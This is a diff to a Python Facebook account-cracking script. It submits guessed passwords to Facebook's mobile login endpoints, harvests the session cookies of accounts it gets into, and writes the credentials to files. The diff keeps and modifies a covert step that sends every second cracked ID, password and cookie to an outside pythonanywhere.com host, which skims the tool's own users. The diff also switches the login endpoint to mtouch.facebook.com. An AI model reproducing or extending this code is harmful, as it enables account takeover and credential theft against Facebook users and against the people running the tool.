@@ -1851,16 +1851,21 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                   bkas.append(cid)
-                   if len(bkas)% 2 == 0:
-                      statusok = (f"{cid}|{pw}|{coki}")
-                      requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                   else:
-                      print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                      print(f" {green}Cookie : {green}{coki}")
-                      open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                      oks.append(cid)
-                      break
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1919,12 +1924,12 @@ def p(uid,pwx,tl):
             'a': 'AYkh5-Ex-aRI47lU6Jgp6nOr4nUFJTvg0RTBgdXo6WoapXVQh6_VcCAiJjMlLOcz71dLoR5aOxzCjylrJvKDQrdmi0ungLJpGVEzgx27yKwTyA',
             'user': '0'}
             headers ={
-            'authority': 'mobile.facebook.com',
+            'authority': 'mtouch.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mobile.facebook.com',
-            'referer': 'https://mobile.facebook.com/login.php',
+            'origin': 'https://mtouch.facebook.com',
+            'referer': 'https://mtouch.facebook.com/login.php',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1941,7 +1946,7 @@ def p(uid,pwx,tl):
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mobile.facebook.com/login/device-based/login/async/"
+            url = "https://mtouch.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
